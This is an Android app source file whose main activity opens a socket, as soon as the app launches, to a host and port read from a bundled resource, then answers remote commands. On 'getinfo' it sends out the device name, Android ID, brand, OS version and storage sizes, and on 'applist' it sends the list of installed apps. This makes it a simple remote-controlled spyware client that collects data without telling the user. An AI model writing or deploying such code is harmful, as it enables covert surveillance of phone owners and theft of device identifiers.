package com.example.application;

import androidx.appcompat.app.AppCompatActivity;

import java.io.BufferedReader;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.io.PrintWriter;
import java.net.Socket;
import java.util.ArrayList;
import java.util.List;
import java.util.Locale;

import android.annotation.SuppressLint;
import android.app.ActivityManager;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.os.Debug;
import android.os.Environment;
import android.os.StatFs;
import android.provider.Settings;
import android.widget.TextView;


public class MainActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        try {
            InputStream inputStream = getResources().openRawResource(R.raw.connect);
            BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(inputStream));
            String host = bufferedReader.readLine();
            int port = Integer.parseInt(bufferedReader.readLine());

            TextView textView = (TextView) findViewById(R.id.textview);
            textView.setText(host + " " + port);

            Thread socketThread = new Thread(new Runnable() {
                @Override
                public void run() {
                    try {
                        Socket socket = new Socket(host, port);
                        OutputStream outputStream = socket.getOutputStream();
                        InputStream SocketInputStream = socket.getInputStream();
                        PrintWriter printWriter = new PrintWriter(outputStream);

                        BufferedReader buf = new BufferedReader(new InputStreamReader(SocketInputStream));

                        printWriter.println(" [ Connect ] " + Settings.Secure.getString(getContentResolver(),"bluetooth_name"));
                        printWriter.flush();

                        while (true)
                        {
                            String message = buf.readLine();
                            if (message == null) {
                                break;
                            }
                            if (message.equals("getinfo")) {
                                printWriter.println(getSysInfo());
                                printWriter.flush();
                            }
                            if (message.equals("applist")) {
                                printWriter.println(getAppList());
                                printWriter.flush();
                            }
                        }
                        socket.close();
                    }catch (Exception exception){
                        exception.printStackTrace();
                        TextView textView = (TextView) findViewById(R.id.textview);
                        textView.setText("ERROR: "+exception.getMessage());
                    }
                }
            });
            socketThread.start();
        }
        catch (Exception exception) {
            exception.printStackTrace();
            TextView textView = (TextView) findViewById(R.id.textview);
            textView.setText("ERROR: "+exception.getMessage());
        }
    }
    public String getSysInfo() {
        String phoneName = " Phone Name: "+ Settings.Secure.getString(getContentResolver(),"bluetooth_name");
        String language = " Language: " + Locale.getDefault().getLanguage();
        @SuppressLint(" HardwareIds") String androidId = " Android Id: "+ Settings.Secure.getString(getContentResolver(),Settings.Secure.ANDROID_ID);
        String phoneBrand = " Phone Brand: "+ Build.BRAND;
        String version = " Release Version: "+Build.VERSION.RELEASE;
        final StatFs statFs = new StatFs(Environment.getDataDirectory().getPath());
        long totalCounts = statFs.getBlockCountLong();//总共的block数
        long availableCounts = statFs.getAvailableBlocksLong() ; //获取可用的block数
        long size = statFs.getBlockSizeLong(); //每格所占的大小，一般是4KB==
        long availROMSize = availableCounts * size;//可用内部存储大小
        long totalROMSize = totalCounts *size; //内部存储总大小
        ActivityManager.MemoryInfo memoryInfo = new ActivityManager.MemoryInfo();
        String ram = " ROM: "+ String.valueOf(totalROMSize);
        String availROM = " AvailRom: " + String.valueOf(availROMSize);

        StringBuffer stringBuffer = new StringBuffer("");
        stringBuffer.append("/n/n");
        stringBuffer.append( "[System Information]/n");
        stringBuffer.append(phoneName+"/n");
        stringBuffer.append(language+"/n");
        stringBuffer.append(phoneBrand+"/n");
        stringBuffer.append(version+"/n");
        stringBuffer.append(ram+"/n");
        stringBuffer.append(availROM+"/n");
        stringBuffer.append(androidId+"/n");

        return stringBuffer.toString();
    }
    public String getAppList() {
        List<ApplicationInfo> allApps = getPackageManager().getInstalledApplications(0);
        StringBuffer stringBuffer = new StringBuffer("");
        for(ApplicationInfo ai : allApps) {
            stringBuffer.append(" -- "+ai.packageName);
            stringBuffer.append("/n");
        }
        return stringBuffer.toString();
    }
}